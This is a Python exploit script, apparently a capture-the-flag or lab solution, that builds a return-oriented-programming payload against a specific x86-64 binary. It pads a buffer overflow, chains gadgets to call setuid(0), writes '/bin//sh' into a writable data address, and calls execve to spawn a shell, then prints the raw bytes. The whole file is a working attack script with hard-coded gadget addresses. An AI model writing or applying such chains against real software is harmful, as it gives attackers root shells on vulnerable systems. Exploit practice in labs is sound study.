#!/usr/bin/env python3

import sys

# start with 120 padding

# syscall : 0x00000000004022c4

# somewhere have payload += b'/bin/sh'

# 0x000000000043f879 xor rax, rax ; ret (sets rax to 0)
# 0x000000000047e780 add rax, 3 ; ret (do this 19 times)
# 0x000000000047e767 add rax, 2 ; ret (do this 1 time)

# 0x0000000000455710 : push qword ptr [rbx + 1] ; ret
# 0x000000000047fc7c : push qword ptr [rdi + 1] ; ret
# 0x00000000004598b1 : push rax ; ret
# 0x000000000040a57e : pop rsi ; ret


p = b'\x90' * 120  # Padding

# set rdi to 0
p += (0x000000000040250f).to_bytes(8, 'little')  # pop rdi ; ret
p += (0x0000000000000000).to_bytes(8, 'little')  # 0 out rdi

# set rax to 105
p += (0x0000000000456587).to_bytes(8, 'little')  # pop rax ; ret
p += (0x69).to_bytes(8, 'little')  # 105

p += (0x000000000041b506).to_bytes(8, 'little')  # syscall

# load "/bin/sh" into rax
p += (0x0000000000456587).to_bytes(8, 'little')  # pop rax ; ret
p += b'/bin//sh'  # need 2 slashes because unix or something

# set rsi to point to data address in mem (read/writable)
p += (0x000000000040a57e).to_bytes(8, 'little')  # pop rsi ; ret
p += (0x00000000004cc0e0).to_bytes(8, 'little')  # data

# write what's in rax (bin/sh) to where rsi points (data address that's read/writable)
p += (0x0000000000458cf5).to_bytes(8, 'little')  # mov qword ptr [rsi], rax ; ret

# load ADDRESS OF /bin/sh into rdi
p += (0x000000000040250f).to_bytes(8, 'little')  # pop rdi ; ret
p += (0x00000000004cc0e0).to_bytes(8, 'little')  # data (contains /bin/sh)

# Load 59 into rax
p += (0x0000000000456587).to_bytes(8, 'little')  # pop rax ; ret
p += (0x3b).to_bytes(8, 'little')  # 59

# Set rsi to 0
p += (0x000000000040a57e).to_bytes(8, 'little')  # pop rsi ; ret
p += (0x0000000000000000).to_bytes(8, 'little')  # rsi = 0

# Set rdx to 0
p += (0x000000000048c0ab).to_bytes(8, 'little')  # pop rdx ; pop rbx ; ret
p += (0x0000000000000000).to_bytes(8, 'little')  # rdx = 0
p += (0x4141414141414141).to_bytes(8, 'little')  # value doesn't matter for rbx

p += (0x00000000004022c4).to_bytes(8, 'little')  # syscall

sys.stdout.buffer.write(p)
